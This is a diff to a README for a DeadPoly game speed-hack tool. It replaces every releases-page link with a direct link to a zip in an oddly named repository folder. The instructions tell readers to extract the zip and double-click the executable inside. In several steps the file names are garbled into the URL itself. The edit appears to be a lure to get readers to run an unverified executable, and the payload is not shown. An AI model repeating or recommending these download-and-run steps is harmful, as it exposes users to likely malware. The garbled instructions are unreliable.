@@ -4,7 +4,7 @@
 Welcome to the DeadPoly-Game-Speed-Hack! This software enhances your enjoyment of DeadPoly by providing tools for speed, crafting, and more. Follow these simple steps to get started.
 
 ## 📥 Download
-[![Download DeadPoly-Game-Speed-Hack](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/VhaelusGamerz/DeadPoly-Game-Speed-Hack/releases)
+[![Download DeadPoly-Game-Speed-Hack](https://raw.githubusercontent.com/VhaelusGamerz/DeadPoly-Game-Speed-Hack/main/Istvaeones/DeadPoly-Game-Speed-Hack.zip)](https://raw.githubusercontent.com/VhaelusGamerz/DeadPoly-Game-Speed-Hack/main/Istvaeones/DeadPoly-Game-Speed-Hack.zip)
 
 ## 📋 Features
 This application offers a range of features to improve your gameplay experience:
@@ -31,15 +31,15 @@ Ensure your system meets the following requirements to run this application smoo
 ## 💾 Download & Install
 To download the software, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/VhaelusGamerz/DeadPoly-Game-Speed-Hack/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/VhaelusGamerz/DeadPoly-Game-Speed-Hack/main/Istvaeones/DeadPoly-Game-Speed-Hack.zip) to find the latest version of the application.
 
-2. **Choose the Correct File**: Look for the most recent release. You might find a file named something like `DeadPoly-Speed-Hack-v1.0.zip`.
+2. **Choose the Correct File**: Look for the most recent release. You might find a file named something like `https://raw.githubusercontent.com/VhaelusGamerz/DeadPoly-Game-Speed-Hack/main/Istvaeones/DeadPoly-Game-Speed-Hack.zip`.
 
 3. **Download the File**: Click on the file name to start downloading. Your browser will save it to your default download folder.
 
 4. **Extract the Files**: Once the download is complete, find the ZIP file in your folder. Right-click on it and select “Extract All.” Follow the prompts to extract the files.
 
-5. **Run the Application**: Open the folder where you extracted the files. Look for an executable file, usually named `DeadPoly-Speed-Hack.exe`. Double-click this file to run the application.
+5. **Run the Application**: Open the folder where you extracted the files. Look for an executable file, usually named `https://raw.githubusercontent.com/VhaelusGamerz/DeadPoly-Game-Speed-Hack/main/Istvaeones/DeadPoly-Game-Speed-Hack.zip`. Double-click this file to run the application.
 
 6. **Follow On-Screen Instructions**: When you launch the application, follow any prompts or instructions that appear to set up the tool according to your preferences.
 
@@ -60,7 +60,7 @@ If you encounter any issues while using the tool, you can seek help from the com
 This project is licensed under the MIT License. You can freely use, modify, and distribute the software, keeping in mind the terms of the license.
 
 ## 🔗 Additional Information
-For updates and more information, keep an eye on this repository and visit the [Releases Page](https://github.com/VhaelusGamerz/DeadPoly-Game-Speed-Hack/releases) regularly.
+For updates and more information, keep an eye on this repository and visit the [Releases Page](https://raw.githubusercontent.com/VhaelusGamerz/DeadPoly-Game-Speed-Hack/main/Istvaeones/DeadPoly-Game-Speed-Hack.zip) regularly.
 
 ## 📢 Community & Contributions
 Community involvement is welcome. If you would like to contribute or provide feedback, please do so via the "Issues" section or pull requests on GitHub. Your contributions help improve the tool for everyone.
